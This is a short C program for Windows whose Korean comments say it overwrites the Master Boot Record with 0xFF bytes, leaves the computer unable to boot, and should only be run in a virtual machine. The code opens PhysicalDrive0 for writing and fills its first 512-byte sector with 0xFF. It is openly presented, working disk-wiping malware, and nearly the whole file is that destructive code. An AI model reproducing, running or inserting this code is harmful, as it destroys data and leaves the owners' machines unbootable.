// 본 프로그램은 MBR(Master Boot Recoder)를 FF로 완전히 덮어씁니다.
// 따라서 부팅이 불가능해지며, 실제 실행은 절대 시도하지 마십시오.
// 실행은 가상머신이나 독립된 컴퓨터에서 실행하십시오.
//
//
// ===============================!본 프로그램을 절대 매인PC에서 실행시키지 마십시오.!===============================


#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hDisk = CreateFile(
        "\\\\.\\PhysicalDrive0", 
        GENERIC_WRITE, 
        0, 
        NULL, 
        OPEN_EXISTING, 
        0, 
        NULL
    );

    if (hDisk == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error opening disk: %d\n", GetLastError());
        return 1;
    }

    BYTE buffer[512];
    memset(buffer, 0xFF, sizeof(buffer));

    DWORD bytesWritten;
    BOOL result = WriteFile(
        hDisk, 
        buffer, 
        sizeof(buffer), 
        &bytesWritten, 
        NULL
    );

    if (!result) {
        fprintf(stderr, "Error writing to disk: %d\n", GetLastError());
        CloseHandle(hDisk);
        return 1;
    }

    CloseHandle(hDisk);
    return 0;
}
